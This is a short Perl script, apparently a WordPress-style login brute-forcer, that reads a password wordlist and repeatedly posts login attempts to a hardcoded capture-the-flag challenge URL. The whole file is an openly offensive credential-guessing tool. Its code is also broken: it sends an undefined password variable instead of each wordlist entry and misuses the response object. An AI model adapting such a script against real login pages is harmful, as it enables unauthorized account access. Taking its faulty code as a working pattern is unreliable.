#!/usr/bin/perl

# WP-BRUTE BY MMXM
# Gr33tz To Cy¢lone & Ut0p|4

use LWP::UserAgent;



my $site = 'http://game.rop.sh/chall/5/index.php';
#$user = $ARGV[1];
my $wordl = $ARGV[0];

my $a;

open($a,"<$wordl") or die "$!";
print "\n\nSite: $site\nUsername:\n\nAttacking...\n\n";
sleep(2);
while(<$a>){
chomp($_);

my $ua = new LWP::UserAgent;

my $response = $ua->post($site, { password => my $pass,submit => 'Log in'});

my $code = $response->code;
my $t = $response->$content;
 print "$code";
}
 exit;